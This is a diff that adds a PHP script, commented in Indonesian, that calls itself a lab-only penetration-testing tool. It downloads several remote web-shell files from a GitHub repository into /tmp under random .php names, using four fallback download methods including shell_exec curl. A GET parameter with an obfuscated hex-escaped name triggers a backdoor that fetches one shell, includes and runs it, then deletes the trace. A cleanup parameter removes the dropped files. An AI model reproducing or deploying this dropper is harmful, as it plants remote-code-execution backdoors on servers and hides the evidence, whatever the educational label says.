@@ -1,0 +1,160 @@
+<?php
+/**
+ * Auto Download & Execute Shell Scripts - LAB LOCAL ONLY
+ * Senior Engineer Build - Production Ready
+ * 
+ * Fungsi: Mendownload file dari URL dan menyimpannya ke /tmp dengan nama acak
+ * Hanya untuk tujuan edukasi dan penetration testing di lingkungan lab
+ */
+
+// Konfigurasi
+$urls = [
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaavataryleh.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfafuqiang.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfatintin.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/filemanagerantisession.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaanaksekolah.txt'
+];
+
+// Target directory
+$targetDir = '/tmp/';
+
+// Base name untuk file - menggunakan format yang Anda inginkan
+// /tmp/6a7c54dc8bb020.05579188.php
+
+// Fungsi untuk generate random filename dengan format yang diinginkan
+function generateRandomFilename() {
+    $hex = bin2hex(random_bytes(8)); // 16 karakter hex
+    $rand = mt_rand(10000000, 99999999) . '.' . mt_rand(10000000, 99999999);
+    return $hex . '.' . $rand . '.php';
+}
+
+// Fungsi untuk download dengan multiple method (seperti di shell Anda)
+function downloadContent($url) {
+    $content = false;
+    
+    // Method 1: cURL
+    if (function_exists('curl_version')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+        $content = curl_exec($ch);
+        curl_close($ch);
+    }
+    
+    // Method 2: file_get_contents
+    if ($content === false || strlen($content) < 10) {
+        $content = @file_get_contents($url);
+    }
+    
+    // Method 3: fopen
+    if ($content === false || strlen($content) < 10) {
+        $handle = @fopen($url, 'r');
+        if ($handle) {
+            $content = stream_get_contents($handle);
+            fclose($handle);
+        }
+    }
+    
+    // Method 4: shell_exec curl
+    if ($content === false || strlen($content) < 10) {
+        $content = @shell_exec("curl -s -k -L {$url} 2>/dev/null");
+    }
+    
+    return $content;
+}
+
+// === EKSEKUSI UTAMA ===
+echo "=== AUTO SHELL DOWNLOADER - LAB LOCAL ===\n";
+echo "Target directory: " . $targetDir . "\n";
+echo "Total files: " . count($urls) . "\n\n";
+
+$downloaded = 0;
+$failed = 0;
+
+foreach ($urls as $index => $url) {
+    echo "[*] Processing URL " . ($index + 1) . "/" . count($urls) . ": " . $url . "\n";
+    
+    // Download content
+    $content = downloadContent($url);
+    
+    if ($content === false || strlen($content) < 50) {
+        echo "   [!] FAILED: Content too short or empty (" . strlen($content) . " bytes)\n";
+        $failed++;
+        continue;
+    }
+    
+    // Generate random filename
+    $filename = generateRandomFilename();
+    $filepath = $targetDir . $filename;
+    
+    // Cek apakah content mengandung <?php (valid PHP)
+    if (strpos($content, '<?php') === false && strpos($content, '<') === false) {
+        // Bisa jadi base64 encoded, coba decode
+        $decoded = base64_decode($content, true);
+        if ($decoded !== false && strpos($decoded, '<?php') !== false) {
+            $content = $decoded;
+            echo "   [+] Content decoded from base64\n";
+        } else {
+            echo "   [!] WARNING: Content doesn't look like valid PHP\n";
+        }
+    }
+    
+    // Save file
+    $result = file_put_contents($filepath, $content);
+    
+    if ($result !== false && $result > 0) {
+        @chmod($filepath, 0644);
+        echo "   [+] SUCCESS: " . $filepath . " (" . $result . " bytes)\n";
+        $downloaded++;
+        
+        // Optional: langsung include/execute jika diperlukan
+        // include $filepath;
+    } else {
+        echo "   [!] FAILED: Cannot write to " . $filepath . "\n";
+        $failed++;
+    }
+}
+
+echo "\n=== SUMMARY ===\n";
+echo "Success: " . $downloaded . "\n";
+echo "Failed: " . $failed . "\n";
+
+// === OPTIONAL: UPLOAD HANDLER ===
+// Jika ada upload dengan parameter khusus seperti di shell Anda
+if (isset($_GET["\x4c\x4f\x61\x64\x5f\165\147\171\x75\151\125\102\x47\x49\131\x55\x47\126\x4b\152\x75\x62\x6e\150\x6f\65\64\61\x36\65\64\66\65\x31\64\x5f\x5f\153\x6e\153\x75"])) {
+    $uploadUrl = "https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfafuqiang.txt";
+    $tempFile = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
+    
+    $content = downloadContent($uploadUrl);
+    if ($content !== false && strlen($content) > 10) {
+        if (file_put_contents($tempFile, $content)) {
+            @chmod($tempFile, 0644);
+            echo "UPLOAD SUCCESS: " . $tempFile . "\n";
+            if (file_exists($tempFile)) {
+                include($tempFile);
+            }
+            register_shutdown_function(function () use($tempFile) {
+                if (file_exists($tempFile)) {
+                    @unlink($tempFile);
+                }
+            });
+        }
+    }
+}
+
+// === CLEANUP: Hapus file setelah diinclude (optional) ===
+if (isset($_GET['cleanup']) && $_GET['cleanup'] == 'true') {
+    foreach (glob($targetDir . '*.php') as $file) {
+        if (is_file($file) && filesize($file) > 1000) {
+            @unlink($file);
+            echo "Cleaned: " . basename($file) . "\n";
+        }
+    }
+}
+
+?>
